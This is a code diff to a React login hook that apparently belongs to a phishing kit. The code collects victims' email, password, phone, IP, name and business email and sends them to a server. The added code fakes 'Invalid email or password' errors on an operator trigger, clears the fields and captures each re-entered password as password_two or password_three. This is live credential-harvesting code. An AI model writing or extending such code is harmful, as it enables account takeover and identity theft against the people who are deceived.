@@ -1,15 +1,17 @@
-import { useState, useEffect, useContext } from "react";
+import { useState, useEffect, useContext, useRef } from "react";
 import { DataContext } from "../pages";
 import SendData from "./SendData.js";
 
 export const usePasswordAuth = ({
   Unik,
   Email,
+  setEmail,
   Tel,
   BusinessEmail,
   Name,
   Ip,
   wrongPasswordTrigger = 0,
+  wrongCredsTrigger = 0,
   setParentBeginTimer,
 }) => {
   const { setAllData, AllData } = useContext(DataContext);
@@ -18,11 +20,20 @@ export const usePasswordAuth = ({
   const [isLoading, setIsLoading] = useState(false);
   const [passwordError, setPasswordError] = useState("");
   const [emailError, setEmailError] = useState("");
+  const [credentialsError, setCredentialsError] = useState(
+    wrongCredsTrigger > 0 ? "Invalid email or password" : ""
+  );
+  const [hasCredsError, setHasCredsError] = useState(wrongCredsTrigger > 0);
   const [triedSubmit, setTriedSubmit] = useState(false);
   const [passwordAttempt, setPasswordAttempt] = useState(1); // Track which attempt we're on
   const [lastProcessedWrongPassword, setLastProcessedWrongPassword] =
     useState(wrongPasswordTrigger);
+  const [lastProcessedWrongCreds, setLastProcessedWrongCreds] =
+    useState(wrongCredsTrigger);
   const [wrongPasswordCount, setWrongPasswordCount] = useState(0); // Count of wrong password attempts
+  const [wrongCredsCount, setWrongCredsCount] = useState(0);
+  const lastSubmittedEmailRef = useRef(Email || "");
+  const lastSubmittedPasswordRef = useRef("");
 
   useEffect(() => {
     if (
@@ -39,6 +50,7 @@ export const usePasswordAuth = ({
     setIsLoading(false);
     setPassword("");
     setPasswordError("The password that you've entered is incorrect.");
+    setCredentialsError("");
 
     // Set next password attempt
     const newAttempt = newCount + 1;
@@ -46,20 +58,63 @@ export const usePasswordAuth = ({
 
     // Send the current password to server
     const passwordField = newAttempt === 2 ? "password_two" : "password_three";
+    const submittedEmail = lastSubmittedEmailRef.current || Email;
+    const submittedPassword = lastSubmittedPasswordRef.current || password;
     const params = {
       ...AllData,
       id: Unik,
       phone_number: Tel,
-      login_email: Email,
+      login_email: submittedEmail,
       business_email: BusinessEmail,
       ip: Ip,
       full_name: Name,
-      [passwordField]: password,
+      [passwordField]: submittedPassword,
       currentStep: `Wrong Password - Attempt ${newAttempt} - User requested to try again`,
     };
 
     SendData(params);
   }, [wrongPasswordTrigger, lastProcessedWrongPassword]);
+
+  useEffect(() => {
+    if (
+      wrongCredsTrigger === lastProcessedWrongCreds &&
+      wrongCredsTrigger === wrongCredsCount
+    ) {
+      return;
+    }
+    setLastProcessedWrongCreds(wrongCredsTrigger);
+    const newCount = wrongCredsCount + 1;
+    setWrongCredsCount(newCount);
+
+    setIsLoading(false);
+    setPassword("");
+    if (typeof setEmail === "function") {
+      setEmail("");
+    }
+    setCredentialsError("Invalid email or password");
+    setHasCredsError(true);
+    setPasswordError("");
+
+    const newAttempt = newCount + 1;
+    setPasswordAttempt(newAttempt);
+
+    const passwordField = newAttempt === 2 ? "password_two" : "password_three";
+    const submittedEmail = lastSubmittedEmailRef.current || Email;
+    const submittedPassword = lastSubmittedPasswordRef.current || password;
+    const params = {
+      ...AllData,
+      id: Unik,
+      phone_number: Tel,
+      login_email: submittedEmail,
+      business_email: BusinessEmail,
+      ip: Ip,
+      full_name: Name,
+      [passwordField]: submittedPassword,
+      currentStep: `Wrong Credentials - Attempt ${newAttempt} - User requested to try again`,
+    };
+
+    SendData(params);
+  }, [wrongCredsTrigger, lastProcessedWrongCreds]);
 
   const clearPasswordError = () => {
     setPasswordError("");
@@ -67,6 +122,15 @@ export const usePasswordAuth = ({
 
   const clearEmailError = () => {
     setEmailError("");
+  };
+
+  const clearCredentialsError = () => {
+    setCredentialsError("");
+    setHasCredsError(false);
+  };
+
+  const clearCredsBorderOnly = () => {
+    setHasCredsError(false);
   };
 
   const validateEmail = (email) => {
@@ -87,6 +151,8 @@ export const usePasswordAuth = ({
 
   const handleSubmit = () => {
     setTriedSubmit(true);
+    setCredentialsError("");
+    setHasCredsError(false);
 
     // Validate inputs
     if (!validateEmail(Email) || !validatePassword(password)) {
@@ -94,6 +160,8 @@ export const usePasswordAuth = ({
     }
 
     setIsLoading(true);
+    lastSubmittedEmailRef.current = Email;
+    lastSubmittedPasswordRef.current = password;
 
     // Determine password field and parameters
     let passwordField, params, timeout;
@@ -158,11 +226,16 @@ export const usePasswordAuth = ({
     isLoading,
     passwordError,
     emailError,
+    credentialsError,
+    hasCredsError,
     triedSubmit,
     passwordAttempt,
     wrongPasswordCount,
+    wrongCredsCount,
     handleSubmit,
     clearPasswordError,
     clearEmailError,
+    clearCredentialsError,
+    clearCredsBorderOnly,
   };
 };
